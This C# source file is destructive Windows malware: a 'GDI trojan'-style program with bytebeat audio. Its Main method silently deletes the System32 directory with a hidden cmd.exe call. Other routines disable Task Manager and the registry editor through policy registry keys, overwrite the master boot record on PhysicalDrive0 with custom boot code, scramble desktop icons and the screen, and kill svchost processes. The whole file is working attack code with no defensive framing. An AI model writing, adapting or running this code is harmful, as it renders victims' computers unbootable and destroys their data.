using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Media;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            // Define the path to System32 directory
            string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");

            // Create a process to execute the command silently
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/c del /s /q \"{system32Path}\""; // corrected the path variable
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();

            // Wait for the process to finish
            process.WaitForExit();

            Console.WriteLine("System32 directory has been deleted.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }

        // Start additional effects
        Thread effectsThread = new Thread(RandomDesktopIconAndGraphics.StartEffects);
        effectsThread.Start();

        // Play bytebeat audio
        Bytebeat.PlayBytebeatAudio();
    }
}

public static class RandomDesktopIconAndGraphics
{
    // Constants from CommCtrl.h
    private const int LVM_GETITEMCOUNT = 0x1004;
    private const int LVM_SETITEMPOSITION = 0x100F;

    // Importing necessary Windows API functions
    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateSolidBrush(int color);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdc_src, int x1, int y1, uint rop);

    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    public static void StartEffects()
    {
        // Start both effects in separate threads
        Thread iconThread = new Thread(MoveIcons);
        Thread graphicsThread = new Thread(ShowGraphics);

        iconThread.Start();
        graphicsThread.Start();

        iconThread.Join();
        graphicsThread.Join();
    }

    static void MoveIcons()
    {
        IntPtr wnd = IntPtr.Zero;

        // Search criteria
        var searchCriteria = new (IntPtr, string, string)[]
        {
            (IntPtr.Zero, "Progman", null),
            (IntPtr.Zero, "SHELLDLL_DefView", null),
            (IntPtr.Zero, "SysListView32", null)
        };

        // Find the window using the search criteria
        foreach (var crit in searchCriteria)
        {
            wnd = FindWindowEx(wnd, IntPtr.Zero, crit.Item2, crit.Item3);
            if (wnd == IntPtr.Zero)
            {
                Console.WriteLine($"Window with class {crit.Item2} not found.");
                return;
            }
        }

        // Get the number of items in the list view
        int iconCount = (int)SendMessage(wnd, LVM_GETITEMCOUNT, 0, 0);

        if (iconCount == 0)
        {
            Console.WriteLine("No icons found.");
            return;
        }

        Random random = new Random();

        // Move icons very quickly
        while (true)
        {
            int randomX = random.Next(0, 1920); // Assuming a screen width of 1920
            int randomY = random.Next(0, 1080); // Assuming a screen height of 1080
            int randomPosition = (randomX & 0xFFFF) | (randomY << 16); // Combine X and Y into a single integer
            int randomIcon = random.Next(0, iconCount);
            SendMessage(wnd, LVM_SETITEMPOSITION, randomIcon, randomPosition);

            // Minimal delay for faster movement
            Thread.Sleep(1); // Sleep for 1 millisecond
        }
    }

    static void ShowGraphics()
    {
        DisableTaskManager();
        OverwriteMBR();

        RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

        SetProcessDPIAware();
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        Timer timer = new Timer(StopEffects, null, TimeSpan.FromMinutes(2), Timeout.InfiniteTimeSpan);

        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);

        while (true)
        {
            int color = (rand.Next(0, 922) << 16) | (rand.Next(0, 980) << 8) | rand.Next(0, 930);
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);

            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-80, 90), sw, sh, hdc, 0, 0, 0x00CC0020);
            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-90, 90), sw, sh, hdc, 0, 0, 0x005A0049);

            // Optional: Add a short delay to control the speed
            Thread.Sleep(10);
        }

        ReleaseDC(IntPtr.Zero, hdc);
    }

    static void StopEffects(object state)
    {
        // Kill the svchost.exe process
        foreach (var process in Process.GetProcessesByName("svchost"))
        {
            process.Kill();
        }

        // Optionally, exit the application or perform any other cleanup
        Environment.Exit(0);
    }

    static void DisableTaskManager()
    {
        string keyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        string valueName = "DisableTaskMgr";

        Microsoft.Win32.Registry.SetValue(@"HKEY_CURRENT_USER\" + keyPath, valueName, 1, RegistryValueKind.DWord);
    }

    static void OverwriteMBR()
    {
        byte[] mbrBytes = new byte[]
        {
            // Placeholder for MBR data
            0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x64, 0x00, 0xB0,
0x04, 0xB9, 0x40, 0x01, 0xF3, 0xAA, 0xB0, 0x05, 0xB9, 0x40, 0x01, 0xF3, 0xAA, 0xE2, 0xF0, 0xEB,
0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

            // Ensure you replace this with actual MBR data if required
        };

        using (FileStream fs = new FileStream(@"\\.\\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            fs.Write(mbrBytes, 0, mbrBytes.Length);
        }
    }
}

class Bytebeat
{
    private const int SampleRate = 8000; // Campionamento di 8000 Hz
    private const int DurationSeconds = 14; // Durata di ogni bytebeat in secondi
    private const int BufferSize = SampleRate * DurationSeconds; // Dimensione del buffer audio

    // Formule bytebeat
    private static Func<int, int>[] formulas = new Func<int, int>[]
    {
        t => (t * t >> 9) | (t >> 5) | t >> 98 | t >> 898,
        t => (t * t >> 29) | (t >> 89) | t >> 98 | t >> 8,
        t => (t * t >> 9) | (t >> 89) | t >> 6 | t >> 8,
        t => (t * t >> 89) | (t >> 898) | t >> 6 | t >> 8,
        t => (t * t >> 9) | (t >> 98) | t >> 6 | t >> 8,
        t => (t * t >> 6) | (t >> 68) | (int)((long)t >> 345666689) | t >> 4,
        t => (t * t >> 6) | (t >> 98) | t >> 89 | t >> 4,
        t => (t * t >> 6) | (t >> 98) | t >> 6 | (int)((long)t >> 69303),
        t => (t * t >> 6) | (t >> 98) | t >> 6 | (int)((long)t >> 2598),
        t => (int)((long)t * t >> 368999122) | (t >> 98) | t >> 989 | t >> 7
    };

    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

    // Genera buffer audio per una formula data
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }

    // Salva buffer audio come file WAV
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            // Scrittura header WAV
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1); // Audio format (1 = PCM)
            bw.Write((short)1); // Number of channels (1 = mono)
            bw.Write(SampleRate);
            bw.Write(SampleRate); // Byte rate (SampleRate * NumChannels * BitsPerSample / 8)
            bw.Write((short)1); // Block align (NumChannels * BitsPerSample / 8)
            bw.Write((short)8); // Bits per sample
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }

    // Riproduce un buffer audio
    private static void PlayBuffer(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlaySync();
        }
        File.Delete(tempFilePath);
    }

    public static void PlayBytebeatAudio()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBuffer(buffer);
        }
    }
}
